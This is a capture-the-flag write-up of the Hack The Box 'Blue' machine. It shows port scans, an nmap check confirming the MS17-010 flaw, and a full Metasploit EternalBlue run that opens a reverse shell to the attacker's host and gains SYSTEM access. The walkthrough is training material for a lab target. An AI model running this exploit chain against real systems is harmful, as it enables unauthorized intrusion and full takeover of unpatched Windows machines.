---
image: /assets/img/blue/blue.png
layout: post
title: Blue
date: 2020-10-1 00:00:01 +5:30
categories: [Hackthebox, Easy]
tags: [eternalblue, smb, windows] # add tag
---

## Summary

>-> From Nmap scan we got few ports(smb) <br />
>-> Checking from vulners, the smb is vulnerable to ms17-010(eternalblue)<br />
>-> Using Msf we will get root<br />

## Walkthrough

We have windows machine moving on to RustScan.

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5
000'.  
Open 10.10.10.40:135
Open 10.10.10.40:139
Open 10.10.10.40:445
Open 10.10.10.40:49152
Open 10.10.10.40:49154
Open 10.10.10.40:49156
Open 10.10.10.40:49153
Open 10.10.10.40:49155
Open 10.10.10.40:49157
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 135,139,445,49152,49154,49156,49153,49155,49157 10.10.10.40

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 21:15 IST
Initiating Ping Scan at 21:15
Scanning 10.10.10.40 [2 ports]
Completed Ping Scan at 21:15, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:15
Completed Parallel DNS resolution of 1 host. at 21:15, 13.00s elapsed
DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 0, TR: 4, CN: 0]
Initiating Connect Scan at 21:15
Scanning 10.10.10.40 [9 ports]
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Completed Connect Scan at 21:15, 0.34s elapsed (9 total ports)
Nmap scan report for 10.10.10.40
Host is up, received conn-refused (0.33s latency).
Scanned at 2020-10-03 21:15:38 IST for 14s

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49155/tcp open  unknown      syn-ack
49156/tcp open  unknown      syn-ack
49157/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds

```

As per name we can see it is windows having smb open so probably eternal Blue

```bash
✘ argenestel@parrot  ~/Desktop/hackthebox/blue  nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 21:21 IST
Nmap scan report for 10.10.10.40
Host is up (0.36s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:  
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|            
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

Gotcha...

## Exploitation

I am going to use metasploit but there are few options available in searchsploit or you can use autoblue.
<https://github.com/blu0/AutoBlue-MS17-010.git>

```terminal

msf5 > search eternal

Matching Modules
================

  #  Name                                           Disclosure Date  Rank     Check  Description
  -  ----                                           ---------------  ----     -----  -----------
  0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalC
hampion SMB Remote Windows Command Execution
  1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
  2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel
Pool Corruption
  3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel
Pool Corruption for Win8+
  4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalC
hampion SMB Remote Windows Code Execution
  5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


msf5 > use 2

msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.10:4444  
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1       
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.40:49158) at 2020-10-03 17:34:06 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

id
id
'id' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Rooted :)
